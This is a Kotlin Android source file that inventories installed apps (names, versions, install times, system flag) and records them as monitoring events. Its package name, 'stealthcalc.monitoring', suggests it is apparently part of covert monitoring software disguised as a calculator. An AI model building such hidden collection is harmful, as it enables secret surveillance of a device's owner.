package com.stealthcalc.monitoring.collector

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.InstalledAppPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class InstalledAppsCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private var lastSnapshot: Set<String> = emptySet()

    suspend fun collect() {
        if (!repository.isMetricEnabled("installed_apps")) return

        val pm = context.packageManager
        @Suppress("DEPRECATION")
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)

        val currentPkgs = apps.map { it.packageName }.toSet()
        if (currentPkgs == lastSnapshot && lastSnapshot.isNotEmpty()) return
        lastSnapshot = currentPkgs

        for (appInfo in apps) {
            val pkgInfo = runCatching {
                pm.getPackageInfo(appInfo.packageName, 0)
            }.getOrNull() ?: continue

            val isSystem = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0
            val versionCode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                pkgInfo.longVersionCode
            } else {
                @Suppress("DEPRECATION") pkgInfo.versionCode.toLong()
            }

            val payload = Json.encodeToString(
                InstalledAppPayload(
                    packageName = appInfo.packageName,
                    appName = pm.getApplicationLabel(appInfo).toString(),
                    versionName = pkgInfo.versionName,
                    versionCode = versionCode,
                    installedAt = pkgInfo.firstInstallTime,
                    updatedAt = pkgInfo.lastUpdateTime,
                    isSystemApp = isSystem,
                )
            )
            repository.recordEvent(MonitoringEventKind.INSTALLED_APPS, payload)
        }
    }
}
